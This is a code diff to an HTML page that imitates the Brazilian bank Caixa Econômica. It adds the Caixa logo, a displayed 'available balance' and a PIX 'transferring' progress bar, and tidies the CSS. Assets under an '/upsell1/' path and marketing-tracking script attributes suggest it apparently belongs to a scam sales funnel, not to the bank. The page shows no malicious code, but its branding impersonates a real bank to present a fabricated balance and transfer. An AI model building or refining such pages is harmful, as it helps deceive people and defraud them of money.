@@ -10,13 +10,6 @@
   <script src="js/latest_1.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
   <script src="https://cdn.tailwindcss.com"></script>
 
-  <style>
-    .status-container{display:flex;flex-direction:column;align-items:center}
-    .status-icon{display:flex;justify-content:center;margin-bottom:.5rem}
-    .status-text{text-align:center;margin-bottom:1rem}
-    .status-progress{width:100%}
-  </style>
-
   <script>
     tailwind.config = {
       theme: {
@@ -43,8 +36,14 @@
 <body class="bg-[#EDF6FF] min-h-screen">
 
 <!-- HEADER -->
-<div class="bg-gradient-to-r from-caixaBlue2 to-caixaLightBlue2 text-white pt-2 pb-8 px-4 mb-2">
+<div class="bg-gradient-to-r from-caixaBlue2 to-caixaLightBlue2 text-white pt-3 pb-8 px-4 mb-2">
 
+  <!-- LOGO CAIXA -->
+  <div class="flex items-center mb-4">
+    <img src="/upsell1/images/logocaixa.png" alt="Caixa Econômica" class="h-7">
+  </div>
+
+  <!-- USUÁRIO -->
   <div class="flex items-center mb-4">
     <div class="w-8 h-8 bg-white bg-opacity-20 rounded-full flex items-center justify-center mr-2">
       <img src="/upsell1/images/usuario.png" class="w-4 h-4" />
@@ -55,6 +54,7 @@
     </div>
   </div>
 
+  <!-- SALDO -->
   <div class="text-center">
     <p class="text-base opacity-90">Saldo disponível</p>
     <p id="saldoDisponivel" class="text-xl font-bold">R$ --</p>
@@ -89,19 +89,13 @@
 
 <!-- STATUS -->
 <div id="statusState" class="hidden">
-  <div class="status-container">
-    <div class="status-icon">
-      <img src="/upsell1/images/pix.png" class="w-6 h-6" />
-    </div>
-    <div class="status-text">
-      <h2 class="text-sm font-bold text-caixaLightBlue">Transferindo...</h2>
-    </div>
-    <div class="status-progress">
-      <div class="w-full bg-gray-200 rounded-full h-2">
-        <div id="progressBar"
-          class="bg-gradient-to-r from-caixaBlue to-caixaLightBlue h-2 rounded-full"
-          style="width:0%"></div>
-      </div>
+  <div class="flex flex-col items-center">
+    <img src="/upsell1/images/pix.png" class="w-6 h-6 mb-2" />
+    <h2 class="text-sm font-bold text-caixaLightBlue mb-2">Transferindo...</h2>
+    <div class="w-full bg-gray-200 rounded-full h-2">
+      <div id="progressBar"
+        class="bg-gradient-to-r from-caixaBlue to-caixaLightBlue h-2 rounded-full"
+        style="width:0%"></div>
     </div>
   </div>
 </div>
